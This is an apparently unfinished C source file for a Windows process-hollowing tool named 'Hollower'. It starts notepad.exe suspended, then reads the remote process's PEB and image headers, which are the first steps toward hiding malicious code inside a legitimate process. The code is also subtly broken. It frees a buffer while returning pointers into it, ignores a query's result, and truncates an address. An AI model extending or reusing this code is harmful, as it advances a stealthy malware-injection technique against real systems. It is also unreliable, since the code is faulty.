#include <Windows.h>

#include "PEB.h"
#include "Ntapi.h"
#include "Hollower.h"

_PPEB ReadRemotePEB(HANDLE);
PLOADED_IMAGE ReadRemoteImage(HANDLE, LPCVOID);

//
// Hollower logic
//
INT main() {
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInformation;
	PLOADED_IMAGE			pImage = NULL;
	_PPEB					pPEB = NULL;
	BOOL					bRet;
	HANDLE					hHostProcess;
	
	//
	// Create host process
	//
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&processInformation, sizeof processInformation);

	if ((bRet = CreateProcessA(NULL,
		"\"notepad.exe\"",
		NULL,
		NULL,
		NULL,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&startupInfo,
		&processInformation)) != TRUE) 
	{
		goto lblCleanup;
	}

	hHostProcess = processInformation.hProcess;
	pPEB = ReadRemotePEB(hHostProcess);

	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);

lblCleanup:
	if (processInformation.hProcess)
		CloseHandle(processInformation.hProcess);

	if (processInformation.hThread)
		CloseHandle(processInformation.hThread);

	if (pPEB)
		free(pPEB);  // todo: replace with virtualfree

	if (pImage)
		free(pImage);   // todo: replace with virtualfree
}

//
// Helper functions
//
PPROCESS_BASIC_INFORMATION FindRemotePEB(HANDLE hProcess) {
	HMODULE hNTDLL = LoadLibraryA("ntdll");

	if (!hNTDLL)
		return NULL;

	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL,"NtQueryInformationProcess");

	if (!fpNtQueryInformationProcess)
		return NULL;

	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)fpNtQueryInformationProcess;
	PPROCESS_BASIC_INFORMATION pBasicInfo = malloc(sizeof(PROCESS_BASIC_INFORMATION));  // todo: Replace with virtualalloc
	DWORD dwReturnLength = 0;

	pNtQueryInformationProcess(hProcess,
		0,
		pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength);
	
	if (pBasicInfo)
		return pBasicInfo;

	free(pBasicInfo);  // todo: replace with virtualfree
	return NULL;
}

_PPEB ReadRemotePEB(HANDLE hProcess) {
	PPROCESS_BASIC_INFORMATION	pBasicInfo = FindRemotePEB(hProcess);
	DWORD						dwPEBAddress = pBasicInfo->PebBaseAddress;

	_PPEB pPEB = malloc(sizeof(_PEB));  // todo: Replace with virtualalloc
	if (!pPEB)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		(LPCVOID)dwPEBAddress,
		pPEB,
		sizeof(_PEB),
		0);
	if (!bSuccess) {
		free(pPEB);
		pPEB = NULL;    // todo: replace with virtualfree
	}

	if (pBasicInfo)
		free(pBasicInfo);  // todo: replace with virtualfree

	return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {
	PLOADED_IMAGE pImage = NULL;
	
	BYTE* lpBuffer = malloc(BUFFER_SIZE);  // todo: Replace with virtualalloc
	if (!lpBuffer)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		lpImageBaseAddress,
		lpBuffer,
		BUFFER_SIZE,
		0);
	if (!bSuccess)
		goto lblCleanup;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
	pImage = malloc(sizeof(LOADED_IMAGE));  // todo: Replace with virtualalloc
	if (!pImage)
		goto lblCleanup;

	pImage->FileHeader = (PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
	pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
	pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

lblCleanup:
	if (lpBuffer)
		free(lpBuffer);  // todo: replace with virtualfree

	return pImage;
}